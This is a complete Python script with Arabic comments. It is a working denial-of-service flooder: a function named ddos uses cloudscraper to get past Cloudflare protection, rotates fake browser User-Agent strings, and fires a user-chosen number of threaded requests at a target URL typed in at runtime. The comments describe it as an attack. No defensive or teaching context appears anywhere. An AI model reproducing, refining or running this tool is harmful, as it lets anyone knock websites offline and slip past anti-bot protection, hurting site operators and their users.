import cloudscraper
import threading
from queue import Queue
import random

# قائمة عناوين المستخدم (User-Agent)
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
]

# قائمة عناوين URL المستهدفة
urls = Queue()

def ddos():
    """
    إرسال طلبات إلى الهدف مع تخطي حماية Cloudflare.
    """
    scraper = cloudscraper.create_scraper()  # إنشاء كائن Scraper
    while not urls.empty():
        url = urls.get()
        try:
            headers = {"User-Agent": random.choice(user_agents)}
            response = scraper.get(url, headers=headers, timeout=10)
            urls.task_done()
        except Exception:
            urls.task_done()

def main():
    """
    الإعداد الرئيسي للهجوم.
    """
    target = input("Enter the target URL (with http/https): ").strip()
    thread_count = int(input("Enter the number of threads: "))
    request_count = int(input("Enter the total number of requests: "))

    # التحقق من القيم المدخلة
    if thread_count <= 0 or request_count <= 0:
        print("Invalid input. The number of threads and requests must be greater than 0.")
        return

    # ملء قائمة الطلبات
    for _ in range(request_count):
        urls.put(target)

    threads = []

    # إنشاء وتشغيل الخيوط
    for _ in range(thread_count):
        thread = threading.Thread(target=ddos)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    # انتظار انتهاء جميع الطلبات
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
